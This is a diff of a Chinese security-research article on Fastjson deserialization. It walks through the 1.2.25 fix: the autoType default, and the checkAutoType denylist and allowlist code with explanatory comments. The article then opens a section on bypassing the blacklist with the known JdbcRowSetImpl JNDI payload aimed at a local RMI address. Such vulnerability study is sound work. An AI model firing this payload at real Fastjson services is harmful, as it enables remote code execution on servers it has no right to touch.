@@ -777,19 +777,125 @@ public class Test {
 
 ![image-20250113162031831](./images/image-20250113162031831.png)
 
-#### 补充分析
+#### Fastjson 1.2.25的修复分析
 
-  本来写完前面的内容，感觉后面的东西不多了，但是梳理了一下fastjson后续的补丁和针对补丁的绕过，绷不住了。由于一个个版本分析实在遭不住，这里补充分析一下三点和安全紧密相关的内容，后续到具体版本就不再具体分析了。
+  Fastjson在1.2.25针对反序列化漏洞进行了第一次修复，确立了修复的方式是采用关闭autoType和黑名单，虽然后续出现了很多绕过手法，但后续的修复方式也是基于第一次修复缝缝补补。
 
-##### fastjson autoType的设置
+##### autoType的关闭和黑名单
 
-  在<=Fastjson 1.2.24时是默认开启autoType的，在之后都设置为默认关闭
+  在<=Fastjson 1.2.24时是默认开启autoType的，在之后都设置为默认关闭。注意到下列变化，loadClass变为了checkAutoType，这个变化很关键
 
-##### fastjson黑名单机制和绕过
+![image-20250116183921007](./images/image-20250116183921007.png)
+
+我们简单看一下这个函数，后面再详细分析：
+
+```java
+public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
+    if (typeName == null) {
+        return null;
+    }
+
+    final String className = typeName.replace('$', '.');
+
+    // 如果autoType开启或者这里显式指定了反序列化的类，进入
+    if (autoTypeSupport || expectClass != null) {
+        // acceptList维护了一个白名单，类以该白名单中的类开头，则进行加载
+        // 1.2.25 该名单为空
+        for (int i = 0; i < acceptList.length; ++i) {
+            String accept = acceptList[i];
+            if (className.startsWith(accept)) {
+                return TypeUtils.loadClass(typeName, defaultClassLoader);
+            }
+        }
+
+        // denyList维护了一个黑名单，类以该黑名单中的类开头，则抛出异常
+        for (int i = 0; i < denyList.length; ++i) {
+            String deny = denyList[i];
+            if (className.startsWith(deny)) {
+                throw new JSONException("autoType is not support. " + typeName);
+            }
+        }
+    }
+
+    // 后续分析，这里先跳过
+    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
+    if (clazz == null) {
+        clazz = deserializers.findClass(typeName);
+    }
+
+    // 加载类后，如果显式指定反序列化的类，要进行判断，是否符合
+    if (clazz != null) {
+        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
+            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
+        }
+
+        return clazz;
+    }
+
+    // autoType 没有开启
+    if (!autoTypeSupport) {
+        // 黑名单判断
+        for (int i = 0; i < denyList.length; ++i) {
+            String deny = denyList[i];
+            // 符合黑名单，抛出异常
+            if (className.startsWith(deny)) {
+                throw new JSONException("autoType is not support. " + typeName);
+            }
+        }
+        // 白名单判断
+        for (int i = 0; i < acceptList.length; ++i) {
+            String accept = acceptList[i];
+            // 符合白名单，进行类加载
+            if (className.startsWith(accept)) {
+                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
+
+                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
+                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
+                }
+                return clazz;
+            }
+        }
+    }
+
+    if (autoTypeSupport || expectClass != null) {
+        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
+    }
+
+    if (clazz != null) {
+
+        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+                ) {
+            throw new JSONException("autoType is not support. " + typeName);
+        }
+
+        if (expectClass != null) {
+            if (expectClass.isAssignableFrom(clazz)) {
+                return clazz;
+            } else {
+                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
+            }
+        }
+    }
+
+    if (!autoTypeSupport) {
+        throw new JSONException("autoType is not support. " + typeName);
+    }
+
+    return clazz;
+}
+```
+
+##### fastjson绕过黑名单
+
+我们还使用之前的Payload打一下
+
+```java
+String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
+
+```
 
 ##### fastjson缓存机制和利用
-
-##### loadClass的特性
 
 #### 1.2.25<=Fastjson<=1.2.41
 
